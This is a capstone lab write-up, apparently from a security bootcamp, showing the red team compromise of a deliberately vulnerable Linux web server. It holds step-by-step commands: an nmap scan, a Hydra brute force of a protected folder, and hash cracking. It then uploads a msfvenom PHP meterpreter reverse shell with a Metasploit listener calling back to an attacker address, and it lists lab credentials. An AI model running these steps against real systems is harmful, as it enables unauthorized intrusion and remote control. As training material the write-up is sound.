# Red Vs. Blue Team Project
Capstone Engagement
Assessment, Analysis, and Hardening of a Vulnerable System
## Red Team
### Step 1: Discover the IP address of the Linux server
Run `nmap 192.168.1.0/24`
* From the Nmap scan we can see that port 80 and port 22 is open
* image
* In the web browser, searched IP 192.168.1.105
* image
### Step 2: Locate the hidden directory on the server.
- Navigated to the secret folder directory by typing: 192.168.1.105/company_folders/secret_folder into the search bar
- The directory asks for authentication in order to access it.The user with access to this folder is Ashton 
### Step 3: Brute force the password for the hidden directory.
- The folder is password protected and we used Hydra to brute force into the directory. We ran Hydra against Ashton's user name and wordlist
- Command: `hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`
- image
- The username is ashton and the password is leopoldo
- W e accessed the Secret folder and we got the information below
- image
- Inside of the WebDAV file are instructions on how to connect to the WebDAV directory, as well the user's username and hashed password.
### Step 4: Connect to the server via Webdav
- We simply used and online tool called Crack Station to break the password hash. https://crackstation.net
- image
- The password is revealed as: linux4u
### Step 5: Connect to the server via WebDAV
- Following the direction in the secret folder
- Open the File System
- Click Browse Network
- Type: dav://192.168.1.105/webdav into the url bar
- Enter Ryan's credentials to log in
- image
### Step 6: Upload a PHP reverse shell payload
- Command to create the reverse shell:
- Commad: `msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php`
- image
- To set up listener
- Run `msfconsole`
- Run `use exploit/multi/handler`
- Run `set payload php/meterpreter/reverse_tcp`
- Run `show options and point out they need to set the LHOST`
- Run `set LHOST 192.168.1.90`
- Run `exploit`
- Copy the reverse shell onto the WebdDAV directory
- image
- connect to the webdav folder by navigating to 192.168.1.105/webdav and use ryan's username and password `username:ryan password:linux4u`
- click on the shell.php file to activate it.
- image
### Step 7: Find and capture the flag
- Run `shell` to drop into bash shell
- Command to find the flag: `find . -iname flag.txt`
